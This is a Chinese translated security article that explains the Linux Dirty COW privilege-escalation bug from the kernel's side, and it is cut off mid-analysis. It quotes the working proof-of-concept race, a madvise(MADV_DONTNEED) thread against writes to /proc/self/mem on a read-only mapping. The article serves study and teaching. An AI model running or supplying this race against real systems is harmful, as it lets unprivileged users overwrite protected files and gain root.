
# [翻译]从内核角度分析Dirty Cow原理

## 介绍

虽然已经有很多文章和博客贴出了该漏洞的利用，但是没有一个给出从内核角度分析Dirty Cow原理的详细描述。如下的分析是基于这个[Dirty Cow POC](<https://bbs.kanxue.com/elink@5dfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1K9i4u0@1P5h3y4G2N6#2)9J5c8X3c8A6M7Y4c8&6j5$3!0%4i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3k6r3W2J5N6s2W2U0x3s2N6Q4x3X3g2U0>)的，同样的思路也适用于其他相似的攻击。例子代码很短，最重要的是两个线程的操作：一个线程调用`write(2)`写`/proc/self/mem`，另一个线程调用`madvice(MADV_DONTNEED)`。由于这两个线程操作的相互竞争，当`wirte(2)`直接修改基于文件的内存映射时（即使涉及到的文件不允许被攻击者进程写）会产生一个安全问题，最终导致提权。

该文章颇重于技术层面，故假设读者已经掌握了如下的基本技术点：

- Virtual Memory（虚拟内存）
- Pages（页）
- Page Fault（页错误）
- Copy-on-Write（写时复制）

## 如何实现攻击

尽管我们最终是想写入，然而代码首先会以只读的方式`O_RDONLY`来打开`open`一个特定的文件，这样做的目的是为了让内核”happy”，由于我们目前只有比较低的权限，无法写入特定的文件。在成功打开并获取了文件描述符之后，立即调用`mmap`来映射该文件。

```
  f=open(argv[1],O_RDONLY);

    fstat(f,&st);

    name=argv[1];

    /*
    You have to use MAP_PRIVATE for copy-on-write mapping.

    > Create a private copy-on-write mapping.  Updates to the

    > mapping are not visible to other processes mapping the same

    > file, and are not carried through to the underlying file.  It

    > is unspecified whether changes made to the file after the

    > mmap() call are visible in the mapped region.

    */

    /*
    You have to open with PROT_READ.

    */

    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
```

调用函数`mmap`在进程的虚拟地址空间中创建了一个基于文件的（file-backed）的只读的内存映射，内核中通过结构`struct vm_area_struect`来描述该内核对象，其包含映射的文件描述符，对于映射的页的读写权限等一些信息。之后创建了两个线程，一个调用`madvice`，另一个调用`write`。

```
    pthread_create(&pth1,NULL,madviseThread,argv[1]);

    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
```

首先看下`madviseThread`做了什么：

```
void *madviseThread(void *arg){

  char *str;

  str=(char*)arg;

  int i,c=0;

  for(i=0;i<100000000;i++)

  {/*

You have to race madvise(MADV_DONTNEED) :: 77aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2j5$3y4W2M7%4y4Q4x3X3g2J5k6h3c8Z5j5i4c8Q4x3X3g2U0L8$3#2Q4x3V1k6K6k6h3y4#2M7X3W2@1P5g2)9J5c8Y4k6#2L8r3&6W2M7X3q4T1K9h3I4A6N6r3W2W2M7#2)9J5c8U0t1%4x3o6j5$3y4U0p5`.

> This is achieved by racing the madvise(MADV_DONTNEED) system call

> while having the page of the executable mmapped in memory.

*/

    c+=madvise(map,100,MADV_DONTNEED);

  }

  printf("madvise %d\n\n",c);}
```

`madvise(MADV_DONTNEED)`基本功能是清除被管理的内存映射的物理页。就当前情况而言，在调用完该函数后，提到的这些页将被clear。当下一次用户尝试访问这些内存区域时，原始的内容会重新从磁盘或者页缓存中导入，而对于匿名的堆内存，则会填充零。

官方文档解释如下：

```
MADV_DONTNEED Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.) Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file
```

`MADV_DONTNEED`在Linux上的行为一直都是有争议的，它并没有完全服从POSIX的标准。事实上，我们将会看到它非标准的行为而导致Dirty COW的攻击变为可能。

继续看另一个线程，此处是攻击的关键点:

```
void *procselfmemThread(void *arg){

    char *str;

    str=(char*)arg;

    /*

       You have to write to /proc/self/mem :: c42K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1N6h3N6*7K9h3I4D9j5g2)9J5k6i4u0W2k6r3S2S2N6q4)9J5k6h3y4G2L8g2)9J5c8Y4y4Z5L8%4N6Q4y4h3k6T1N6h3N6Q4x3X3g2U0k6$3W2Q4x3@1k6A6k6q4)9K6c8o6p5K6z5o6b7K6y4o6c8Q4x3U0y4U0x3e0j5`.

       >  The in the wild exploit we are aware of doesn't work on Red Hat

       >  Enterprise Linux 5 and 6 out of the box because on one side of

       >  the race it writes to /proc/self/mem, but /proc/self/mem is not

       >  writable on Red Hat Enterprise Linux 5 and 6.

     */

    int f=open("/proc/self/mem",O_RDWR);

    int i,c=0;

    for(i=0;i<100000000;i++) {

        /*

           You have to reset the file pointer to the memory position.

         */

        lseek(f,(uintptr_t) map,SEEK_SET);

        c+=write(f,str,strlen(str));

    }

    printf("procselfmem %d\n\n", c);}
```

它首先`lseek`到映射的地址，之后调用`write(2)`便实现了直接修改原本是只读权限的file-backed的内存映射。究竟是哪种行为导致特权文件的修改？HOW???!!!

## `write(2)` on `/proc/{pid}/mem`

`/proc/{pid}/meme`是一个假的文件，它提供了一些Out-of-band的访问内存的方法。另一个类似的访问是调用`ptrace(2)`，同样的，也可称为Dirty COW的另一个可选的攻击点。

为弄清楚`/proc/self/mem`如何工作，我们需要深入的了解内核。首先看下对于虚拟的文件，`write(2)`是如何实现的。

在内核层面中，文件系统的操作的实现是利用面向对象的思想设计的（OOP）。有一个通用的抽象的结构`struct file_operations`。不同的文件类型，可以提供不同的实现。对于`/proc/{pid}/mem`，它的实现在文件`/fs/proc/base.c`中。

```
static const struct file_operations proc_mem_operations = {

    .llseek  = mem_lseek,

    .read    = mem_read,

    .write   = mem_write,

    .open    = mem_open,

    .release = mem_release,};
```

当`write(2)`写一个虚拟文件时，内核将调用函数`mem_write`，它只是对`meme_rw`的一个简单的封装。

```
static ssize_t mem_rw(struct file *file, char __user *buf, size_t count, loff_t *ppos, int write){

    struct mm_struct *mm = file->private_data;

    unsigned long addr = *ppos;

    ssize_t copied;

    char *page;

    if (!mm)

        return 0;

    /* allocate an exchange buffer */

    page = (char *)__get_free_page(GFP_TEMPORARY);

    if (!page)

        return -ENOMEM;

    copied = 0;

    if (!atomic_inc_not_zero(&mm->mm_users))

        goto free;

    while (count > 0) {

        int this_len = min_t(int, count, PAGE_SIZE);

        /* copy user content to the exchange buffer */

        if (write && copy_from_user(page, buf, this_len)) {

            copied = -EFAULT;

            break;

        }

        this_len = access_remote_vm(mm, addr, page, this_len, write);

        if (!this_len) {

            if (!copied)

                copied = -EIO;

            break;

        }

        if (!write && copy_to_user(buf, page, this_len)) {

            copied = -EFAULT;

            break;

        }

        buf += this_len;

        addr += this_len;

        copied += this_len;

        count -= this_len;

    }

    *ppos = addr;

    mmput(mm);free:

    free_page((unsigned long) page);

    return copied;}
```

函数开始的时候分配了一个临时的内存buffer，用来在源进程（i.e. 写的那个进程）和目的进程（被写`/proc/self/mem`的那个进程）之间的内存交换。当前，这两个进程是一样的。但是在一般情况下这一步是非常重要的，对于两个不同的进程。因为一个进程不能直接访问另一个进程的虚拟地址空间。

之后它拷贝源进程的用户态 buffer `buf`中的内容到当前刚申请的空间中，通过调用函数`copy_from_use`。

当这些前奏工作准备好之后，真正关键的部分是`access_remote_vm`。正如其名字含义一样，它允许内核读写另一个进程的虚拟地址空间。它是所有out-of-band访问内存方式的核心实现（比如，`ptrace(2)`、`/proc/self/mem`、`process_vm_readv`、`process_vm_writev`等）。

`access_remote_vm`调用了多个中间层函数，最终调用`__get_user_pages_locked(...)`,在这个函数中，它第一次开始解析这种out-of-band访问方式的`flags`，当前情况的标志为：

`FOLL_TOUCH | FOLL_REMOTE | FOLL_GET | FOLL_WRITE | FOLL_FORCE`

这些被称为`gup_flags`(Get User Pages flags)或者`foll_flags`(Follow flags)，它们来代表一些信息，比如调用者为什么或以何种方式访问和获得目标的内存页。我们暂称它为`access semantics（访问语义）`。

之后`flag`和所有其他的参数之后传递给`__get_user_pages`，此时才是开始真正地访问远程进程内存。

### `__get_user_pages` 和 `faultin_page`

`__get_use_pages`函数用来查找和锁定一个指定的虚拟地址范围（在远程进程的虚拟地址空间范围内）到内核地址空间范围内。锁定内存是必须的，若没有这一步，用户态页面可能不在内存中。之后`__get_user_pages`以某种方式模拟用户态内存访问，但是是在内核层面上，之后使用`faultin_page`来完成对页错误的处理。

如下是相关代码片段：
